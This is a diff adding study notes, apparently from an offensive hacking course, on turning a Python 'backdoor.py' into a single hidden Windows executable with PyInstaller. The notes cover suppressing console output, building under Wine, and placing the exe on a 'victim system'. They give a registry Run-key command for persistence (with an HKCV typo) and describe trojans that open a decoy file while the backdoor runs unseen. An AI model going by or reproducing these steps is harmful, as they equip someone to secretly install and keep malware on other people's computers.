@@ -1,0 +1,63 @@
+pyinstaller
+
+install pyinstaller to convert and pack all python code into 1 executable for the targetted operating system
+
+pip install pyinstaller 
+#for linux
+
+c:\python27\python.exe -m pip install pyinstaller
+or
+c:\python27\scripts\pip.exe install pyinstaller
+#for windows
+
+create python exe on windows system
+
+c:\python27\scripts\pyinstaller.exe backdoor.py --onefile 
+#pack all lib and support file in --onefile
+#it will create a binary executable of backdoor it will execute when double click with a visible backgroung execution
+
+c:\python27\scripts\pyinstaller.exe backdoor.py --onefile --noconsole
+
+#to run invisible in background
+
+edit the script littlebit to run in background to tell what to go with stdinput stdoutput stderror we already written stdoutput in our code its time to write stdin and stderr
+
+#in python3
+subprocess.check_output(commmad,shell=True,stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL)
+
+#in python 
+DEVNULL = open(os.devnull,"wb")
+subprocess.check_output(commmad,shell=True,stderr=DEVNULL,stdin=DEVNULL)
+
+To create a Python Executable it better to do that os environment
+that is to run a py executable in windows 
+create the py exe in windows operating system with the required lib and modules is installed and then put the py exe in victim system to run
+
+Use windows Python Interpreter in Linux
+wine is use to run windows software in linux
+
+Install python exe in linux
+wine msiexec /i python-2.7.15.amd64.msi
+
+Location of wine installation of python
+
+~/.wine/drive_c/Python27/
+
+pip install in windows interpreter of linux
+
+~/.wine/drive_c/Python27/wine python.exe -m pip install pyinstaller
+
+Maintain persistent by puting the script in startup when the os boot these scripts always gets loaded
+
+in windows Registry
+Computer\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+
+in cmd prompt we can change value
+reg add HKCV\Software\Microsoft\Windows\CurrentVersion\Run /v name /t REG_SZ /d "location of backdoor.exe"
+
+Trojans
+
+Trojans is a file that looks and function like a normal file like image,pdf,song
+
+when the user clicks on it the image open on foreground and script run invisible in background
+
